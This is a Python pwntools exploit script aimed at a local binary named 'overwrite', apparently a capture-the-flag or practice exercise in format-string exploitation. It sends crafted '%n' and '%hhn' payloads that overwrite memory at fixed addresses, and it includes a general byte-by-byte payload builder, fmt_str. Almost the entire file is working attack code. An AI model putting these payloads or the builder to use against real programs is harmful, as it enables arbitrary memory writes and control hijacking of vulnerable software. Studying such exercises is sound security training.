from pwn import *

p = process('./overwrite')

def fugai() :
    c_addr = int(p.recvuntil('\n'),16)
    print hex(c_addr)
    playload = p32(c_addr) + '%12d' + '%6$n'
    p.sendline(playload)
    print p.recv()
    p.interactive()

def fugaia() :
    a_addr = 0x0804A024
    playload = 'aa%8$nbb' + p32(a_addr)
#    gdb.attach(p)
    p.sendline(playload)
    print p.recv()
    p.interactive()

def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr


def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload

def zhuchengxu() :
    playload = fmt_str(6,4,0x0804A028,0x12345678)
    p.sendline(playload)
    print playload
    print p.recv()
    p.interactive()

zhuchengxu()
